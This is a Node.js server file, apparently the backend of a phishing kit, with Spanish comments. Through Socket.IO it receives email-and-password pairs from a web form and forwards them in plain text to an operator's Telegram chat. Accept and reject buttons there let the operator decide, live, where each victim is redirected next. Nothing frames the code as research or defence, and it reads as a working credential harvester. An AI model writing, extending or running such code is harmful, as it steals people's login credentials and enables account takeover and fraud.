// server.js
require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid'); // Generador de IDs únicos

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const activeSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

io.on('connection', (socket) => {
  console.log('🧠 Usuario conectado:', socket.id);

  socket.on('dataForm', ({ correo, contrasena }) => {
    const sessionId = uuidv4(); // Crear ID único para esta sesión
    activeSockets.set(sessionId, socket); // Guardar el socket usando sessionId

    const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;

    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
            { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });
});

bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;

  if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
    const sessionId = data.split('_')[1];
    const socket = activeSockets.get(sessionId);

    if (socket) {
      const redireccion = data.startsWith('aprobado_') ? '/index.html' : '/rechazado.html';
      socket.emit('redirect', { url: redireccion });

      const respuesta = data.startsWith('aprobado_')
        ? '🟢 ¡Acceso aprobado!'
        : '🔴 Acceso denegado.';

      bot.sendMessage(chatId, respuesta);
      activeSockets.delete(sessionId);
    } else {
      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
    }
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
});
